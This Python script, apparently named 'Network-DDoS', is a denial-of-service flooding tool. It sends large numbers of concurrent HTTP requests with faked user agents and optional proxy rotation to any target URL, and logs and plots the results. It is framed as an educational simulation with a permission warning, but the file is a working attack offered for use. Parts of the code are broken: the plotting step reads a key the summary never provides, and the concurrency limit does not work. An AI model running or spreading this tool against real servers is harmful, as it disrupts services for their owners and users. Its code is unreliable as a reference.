import asyncio
import aiohttp
import time
import random
import argparse
import json
import logging
from faker import Faker
from dataclasses import dataclass
from typing import Dict, List, Optional
from tqdm import tqdm
import matplotlib.pyplot as plt

# Setup logging
logging.basicConfig(
    filename="ddos_attack.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

fake = Faker()

# Attack Profile Definition
@dataclass
class AttackProfile:
    name: str
    methods: list
    headers: dict
    payload_generator: callable
    delay_variance: float

    def generate_request(self, request_id: int, url: str, proxies: list = None) -> dict:
        method = random.choice(self.methods)
        headers = {k: v() if callable(v) else v for k, v in self.headers.items()}
        payload = self.payload_generator()
        proxy = random.choice(proxies) if proxies else None
        return {
            "id": request_id,
            "method": method,
            "url": url,
            "headers": headers,
            "payload": payload,
            "delay_variance": self.delay_variance,
            "proxy": proxy
        }

# Default Profiles
DEFAULT_PROFILES = [
    AttackProfile(
        name="Normal Traffic",
        methods=["GET"],
        headers={"User-Agent": lambda: fake.user_agent(), "Accept": "*/*"},
        payload_generator=lambda: None,
        delay_variance=0.1
    ),
    AttackProfile(
        name="API Stress",
        methods=["POST", "PUT"],
        headers={"User-Agent": lambda: fake.user_agent(), "Content-Type": "application/json"},
        payload_generator=lambda: json.dumps({"id": random.randint(1, 1000), "data": fake.text()}),
        delay_variance=0.05
    ),
    AttackProfile(
        name="Heavy Load",
        methods=["POST"],
        headers={"User-Agent": lambda: fake.user_agent(), "Content-Length": "1024"},
        payload_generator=lambda: fake.text(max_nb_chars=1024),
        delay_variance=0.02
    )
]

# Metrics Class
class Metrics:
    def __init__(self):
        self.success = 0
        self.failure = 0
        self.response_times = []
        self.lock = asyncio.Lock()

    async def record(self, success: bool, response_time: float):
        async with self.lock:
            if success:
                self.success += 1
            else:
                self.failure += 1
            self.response_times.append(response_time)

    def summary(self) -> Dict:
        total = self.success + self.failure
        avg_time = sum(self.response_times) / len(self.response_times) if self.response_times else 0
        return {
            "total": total,
            "success": self.success,
            "failure": self.failure,
            "success_rate": (self.success / total) * 100 if total > 0 else 0,
            "avg_response_time": avg_time,
            "min_response_time": min(self.response_times or [0]),
            "max_response_time": max(self.response_times or [0])
        }

# Plotting Function
def plot_metrics(metrics_summary: Dict):
    plt.figure(figsize=(12, 7))
    plt.hist(metrics_summary["response_times"], bins=30, color='red', alpha=0.7)
    plt.title("DDoS Attack Response Time Distribution")
    plt.xlabel("Time (s)")
    plt.ylabel("Frequency")
    plt.grid(True, alpha=0.3)
    plt.savefig("attack_response_times.png")
    print("Response time distribution saved as 'attack_response_times.png'")

# Async Request Sender
async def send_request(session: aiohttp.ClientSession, req: Dict, metrics: Metrics, rate_limit: float, progress: tqdm):
    try:
        start_time = time.time()
        proxy = req.get("proxy")
        async with session.request(
            method=req["method"],
            url=req["url"],
            headers=req["headers"],
            data=req["payload"],
            timeout=aiohttp.ClientTimeout(total=5),
            proxy=proxy
        ) as response:
            elapsed_time = time.time() - start_time
            success = response.status == 200
            await metrics.record(success, elapsed_time)
            logging.info(f"Request {req['id']}: {req['method']} - Status {response.status} - Time {elapsed_time:.3f}s")
    except Exception as e:
        elapsed_time = time.time() - start_time
        await metrics.record(False, elapsed_time)
        logging.error(f"Request {req['id']}: {req['method']} - Failed - Error: {e}")
    progress.update(1)
    await asyncio.sleep(rate_limit + random.uniform(0, req["delay_variance"]))

# Main Attack Function
async def run_attack(url: str, request_count: int, concurrency: int, rate_limit: float, proxies: Optional[List[str]] = None):
    metrics = Metrics()
    requests_list = [
        profile.generate_request(i, url, proxies)
        for i in range(1, request_count + 1)
        for profile in random.choices(DEFAULT_PROFILES, k=1)
    ]
    
    print(f"\nStarting DDoS simulation on {url} by It Is Unique Official")
    print(f"Requests: {request_count}, Concurrency: {concurrency}, Rate Limit: {rate_limit}s")
    with tqdm(total=request_count, desc="Attack Progress", unit="req") as progress:
        async with aiohttp.ClientSession() as session:
            tasks = [send_request(session, req, metrics, rate_limit, progress) for req in requests_list]
            await asyncio.gather(*tasks[:concurrency])  # Initial batch
            await asyncio.gather(*tasks[concurrency:])  # Remaining
    
    return metrics

# Execute Attack
def execute_attack(url: str, request_count: int, concurrency: int, rate_limit: float, proxies: Optional[List[str]] = None):
    start_time = time.time()
    metrics = asyncio.run(run_attack(url, request_count, concurrency, rate_limit, proxies))
    total_time = time.time() - start_time
    
    summary = metrics.summary()
    print("\n=== DDoS Simulation Summary ===")
    print("Developed by It Is Unique Official")
    for key, value in summary.items():
        print(f"{key.replace('_', ' ').title()}: {value:.2f}" if isinstance(value, float) else f"{key.replace('_', ' ').title()}: {value}")
    print(f"Total Time Taken: {total_time:.2f}s")
    
    plot_metrics(summary)
    logging.info(f"Attack completed in {total_time:.2f}s")

# CLI Setup
def main():
    parser = argparse.ArgumentParser(description="Network-DDoS: Educational DDoS Simulation Tool by It Is Unique Official")
    parser.add_argument("--url", required=True, help="Target URL to simulate attack on")
    parser.add_argument("--requests", type=int, default=500, help="Number of requests to send")
    parser.add_argument("--concurrency", type=int, default=50, help="Number of concurrent connections")
    parser.add_argument("--rate-limit", type=float, default=0.05, help="Delay between requests (seconds)")
    parser.add_argument("--proxies", nargs="*", help="List of proxy URLs (e.g., http://proxy:port)")
    
    args = parser.parse_args()
    
    print("\nWARNING: This tool is for EDUCATIONAL PURPOSES ONLY. Use it only on servers you own or have permission to test.")
    print("Unauthorized use is illegal and unethical.\n")
    
    execute_attack(args.url, args.requests, args.concurrency, args.rate_limit, args.proxies)

if __name__ == "__main__":
    main()
